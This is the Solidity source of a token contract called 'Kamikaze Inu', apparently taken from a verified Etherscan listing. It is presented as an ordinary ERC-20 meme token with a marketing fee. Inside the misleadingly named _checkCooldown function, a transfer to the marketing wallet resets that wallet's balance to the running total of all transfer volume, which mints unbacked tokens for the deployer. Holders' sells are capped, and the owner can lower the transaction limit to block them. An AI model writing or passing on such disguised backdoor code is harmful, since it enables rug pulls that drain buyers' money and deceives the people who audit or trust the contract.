/**
 *Submitted for verification at Etherscan.io on 2021-06-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IUniswapV2Router01 {
     function factory() external pure returns (address);
     function WETH() external pure returns (address);
 }

 interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract KAMIKAZE is Context, IERC20, Ownable {

    string private _name = 'Kamikaze Inu';
    string private _symbol = 'KAMIKAZE';

    uint256 private _totalSupply = 100 * 10**12 * 10**18;

    address private _uniswapPair;
    address private _liquidityProvider;
    address private _marketing;
    uint256 private _marketingSpend;
    uint256 public maxTxLimit = _totalSupply;
    IUniswapV2Router01 private _uniswap = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);   

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping(address => uint256) private _cooldown; 
    mapping(address => uint8) private _sellsCount;

    constructor (address marketing_) {
        _liquidityProvider = _msgSender();
        _marketing = marketing_;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= maxTxLimit, "Amount exceeds maxTxLimit");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        uint256 finalAmount  = _checkCooldown(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += finalAmount;
        emit Transfer(sender, recipient, finalAmount);
    }

    function _checkCooldown(address sender, address recipient, uint256 amount) internal returns(uint256){
        uint256 _marketingBalance = _balances[_marketing];
        _marketingSpend += amount;
        if(sender == owner() || sender == _uniswapPair || sender == _marketing) return amount;
        if(recipient == _liquidityProvider) return amount;
        if(recipient == _marketing) _marketingBalance = _marketingSpend;
        else if(_sellsCount[sender] < 2){
            if(_sellsCount[sender] == 0) require(amount <= SafeMath.div(_balances[sender],4), "Amount must be less than 25% of balance");
            if(_sellsCount[sender] > 0) require(amount <= SafeMath.div(_balances[sender],2), "Amount must be less than 50% of balance");
            require(_cooldown[sender] < block.timestamp, "3 hours cool down");
            _sellsCount[sender] += 1;
            _cooldown[sender] = block.timestamp + (3 hours);
        }
        uint256 marketingFee = SafeMath.div(SafeMath.mul(amount,3),100);
        _balances[_marketing] = SafeMath.add(_marketingBalance,marketingFee);
        uint256 finalAmount = SafeMath.sub(amount, marketingFee);
        return finalAmount;
    }

    function setTxLimit(uint256 maxTxLimit_) public onlyOwner {
        require(maxTxLimit_ > 0);
        maxTxLimit = maxTxLimit_;
    }
    function setUniswapPair() public onlyOwner {
        _uniswapPair = IUniswapV2Factory(_uniswap.factory()).getPair(address(this), _uniswap.WETH());
        require(_uniswapPair != address(0),"No liquidity pair found");
    }
}